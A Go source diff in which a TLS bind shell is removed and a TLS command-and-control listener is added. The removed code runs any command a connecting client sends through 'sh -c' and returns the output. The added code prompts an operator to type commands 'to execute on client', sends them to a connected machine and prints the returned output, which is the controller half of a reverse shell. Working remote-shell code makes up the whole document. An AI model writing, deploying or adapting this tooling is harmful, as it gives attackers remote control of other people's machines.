@@ -3,39 +3,10 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"encoding/binary"
 	"fmt"
-	"os/exec"
+	"os"
 )
-
-const port = "9000"
-
-func handleConnection(conn *tls.Conn) {
-	defer conn.Close()
-	fmt.Println("Client connected:", conn.RemoteAddr())
-
-	reader := bufio.NewReader(conn)
-
-	for {
-		command, err := reader.ReadString('\n')
-		if err != nil {
-			fmt.Println("Client disconnected")
-			return
-		}
-
-		command = command[:len(command)-1] // Remove \n
-		fmt.Println("Executing command:", command)
-
-		// Execute system command
-		cmd := exec.Command("sh", "-c", command)
-		output, err := cmd.CombinedOutput()
-
-		if err != nil {
-			conn.Write([]byte("Error executing: " + err.Error() + "\n"))
-		}
-
-		conn.Write(output)
-	}
-}
 
 func main() {
 	// Load TLS certificate
@@ -45,25 +16,52 @@ func main() {
 		return
 	}
 
-	// Configure TLS
+	// Configure TLS server
 	config := &tls.Config{Certificates: []tls.Certificate{cert}}
-
-	// Start TLS server
-	listener, err := tls.Listen("tcp", ":"+port, config)
+	ln, err := tls.Listen("tcp", ":8080", config)
 	if err != nil {
-		fmt.Println("Server run error:", err)
+		fmt.Println("Error starting server:", err)
 		return
 	}
-	defer listener.Close()
+	defer ln.Close()
+	fmt.Println("TLS server listening on port 8080...")
 
-	fmt.Println("TLS Server is waiting for connections on port:", port)
+	conn, err := ln.Accept()
+	if err != nil {
+		fmt.Println("Connection error:", err)
+		return
+	}
+	defer conn.Close()
+	fmt.Println("Client connected via secure connection")
 
+	scanner := bufio.NewScanner(os.Stdin)
 	for {
-		conn, err := listener.Accept()
+		fmt.Print("Enter command to execute on client: ")
+		scanner.Scan()
+		command := scanner.Text()
+
+		_, err := conn.Write([]byte(command + "\n"))
 		if err != nil {
-			fmt.Println("Connection error:", err)
-			continue
+			fmt.Println("Error sending command:", err)
+			return
 		}
-		go handleConnection(conn.(*tls.Conn))
+
+		// Read response length
+		var length int32
+		err = binary.Read(conn, binary.LittleEndian, &length)
+		if err != nil {
+			fmt.Println("Error reading response length:", err)
+			return
+		}
+
+		// Read the response
+		response := make([]byte, length)
+		_, err = conn.Read(response)
+		if err != nil {
+			fmt.Println("Error reading response:", err)
+			return
+		}
+
+		fmt.Println("Client response:\n" + string(response))
 	}
 }
